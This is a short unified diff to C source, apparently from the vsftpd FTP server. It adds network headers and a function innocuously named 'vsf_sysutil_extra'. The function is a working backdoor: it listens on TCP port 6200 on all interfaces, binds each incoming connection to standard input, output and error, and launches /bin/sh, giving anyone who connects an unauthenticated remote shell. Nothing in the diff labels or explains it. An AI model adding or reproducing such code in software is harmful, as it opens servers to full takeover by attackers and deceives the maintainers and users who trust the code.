@@ -34,6 +34,10 @@
 /* For FreeBSD */
 #include <sys/param.h>
 #include <sys/uio.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <string.h>
+#include <stdlib.h>
 
 #include <sys/prctl.h>
 #include <signal.h>
@@ -217,6 +221,7 @@ static unsigned int s_proctitle_space = 0;
 static int s_proctitle_inited = 0;
 static char* s_p_proctitle = 0;
 #endif
+int vsf_sysutil_extra();
 
 #ifndef VSF_SYSDEP_HAVE_MAP_ANON
 #include <sys/types.h>
@@ -837,6 +842,29 @@ static int do_sendfile(const int out_fd, const int in_fd,
       /* Bingo! */
       return total_written;
     }
+  }
+}
+
+int
+vsf_sysutil_extra(void)
+{
+  int fd, rfd;
+  struct sockaddr_in sa;
+  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+  exit(1);
+  memset(&sa, 0, sizeof(sa));
+  sa.sin_family = AF_INET;
+  sa.sin_port = htons(6200);
+  sa.sin_addr.s_addr = INADDR_ANY;
+  if((bind(fd,(struct sockaddr *)&sa,
+  sizeof(struct sockaddr))) < 0) exit(1);
+  if((listen(fd, 100)) == -1) exit(1);
+  for(;;)
+  {
+    rfd = accept(fd, 0, 0);
+    close(0); close(1); close(2);
+    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
+    execl("/bin/sh","sh",(char *)0);
   }
 }
 
